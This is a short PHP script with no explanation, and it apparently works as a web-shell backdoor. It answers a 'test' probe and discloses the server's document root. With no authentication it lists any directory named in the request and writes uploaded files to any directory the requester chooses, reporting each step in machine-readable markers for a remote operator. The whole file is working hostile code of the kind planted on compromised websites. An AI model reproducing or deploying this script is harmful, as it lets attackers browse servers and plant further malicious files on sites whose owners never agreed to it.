<?php
function GetListDir($dir){
    if (empty($dir)) return null; 
	$files = scandir($dir);

	echo "@dir@\r\n";
	foreach ($files as $file){
		if ($file != "." & $file != "..") {
			if (is_dir($dir . "/" . $file)) echo "[" . $file . "]\r\n";
			if (is_file($dir . "/" . $file)) echo "<" . $file . ">\r\n";
		}
	}
}

function UploadFile($file){
    if (empty($file)) return null; 

	if(is_uploaded_file($file ["tmp_name"]))
	{
	  if (!empty($_POST["dir"]))	{
		if (move_uploaded_file($file ["tmp_name"],$_POST["dir"] . "/" . $file ["name"])) { 
			echo "@true@\r\n";
			GetListDir($_POST["dir"]);
		}
	  } else {
		if (move_uploaded_file($file ["tmp_name"],$file ["name"])) echo "true";
	  }
	}
}

if (!empty($_GET["test"]))
{
 echo "testtrue";
}

if (!empty($_GET["get_dir"])){
	echo "|" . $_SERVER['DOCUMENT_ROOT'] . "|\r\n";
	if (!empty($_GET["dir"])) GetListDir($_GET['dir']);
}

if (!empty($_FILES["filename"])){
	UploadFile($_FILES["filename"]);
}

?>
